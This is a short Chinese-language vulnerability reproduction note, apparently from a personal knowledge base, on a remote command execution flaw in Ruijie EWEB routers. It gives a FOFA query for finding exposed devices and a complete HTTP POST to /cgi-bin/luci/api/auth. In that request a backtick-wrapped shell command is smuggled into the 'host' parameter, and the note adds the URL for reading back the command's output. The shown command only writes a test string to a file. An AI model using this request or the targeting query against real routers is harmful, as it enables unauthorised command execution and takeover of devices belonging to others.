# 锐捷 EWEB路由器 auth 远程命令执行漏洞

# 一、漏洞简介
锐捷睿易是锐捷网络面向商务市场的子品牌。拥有便捷的网络、交换机、路由器、无线、安全、云服务六大产品线，解决方案涵盖商业零售、酒店、kt、网吧、监控与安全、物流、仓储、制造。通过该漏洞，攻击者可以任意执行服务器端的代码，编写后门，获得服务器权限，进而控制整个web服务器。

# 二、影响版本
+ 锐捷 EWEB路由器

# 三、资产测绘
+ fofa`body="cgi-bin/luci" && body="#f47f3e"`
+ 特征

![1709883604157-a88eaed0-f449-414c-86ab-4951422896ee.png](./img/jMJPLGwCvErQjGMK/1709883604157-a88eaed0-f449-414c-86ab-4951422896ee-226270.png)

# 四、漏洞复现
```plain
POST /cgi-bin/luci/api/auth HTTP/1.1
Host: 
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

{"method":"checkNet","params":{"host":"`echo c149136B>AD0D5b8c.txt`"}}
```

![1709883649047-81989889-fb44-46a7-bfdc-3850b3fdc6f4.png](./img/jMJPLGwCvErQjGMK/1709883649047-81989889-fb44-46a7-bfdc-3850b3fdc6f4-707818.png)

获取命令执行结果

```plain
/cgi-bin/AD0D5b8c.txt
```

![1709883674250-cfa2c2d1-6da8-4b48-9091-344fac04b808.png](./img/jMJPLGwCvErQjGMK/1709883674250-cfa2c2d1-6da8-4b48-9091-344fac04b808-337780.png)



> 更新: 2024-06-24 11:42:26  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vx00xdatfw3yw8px>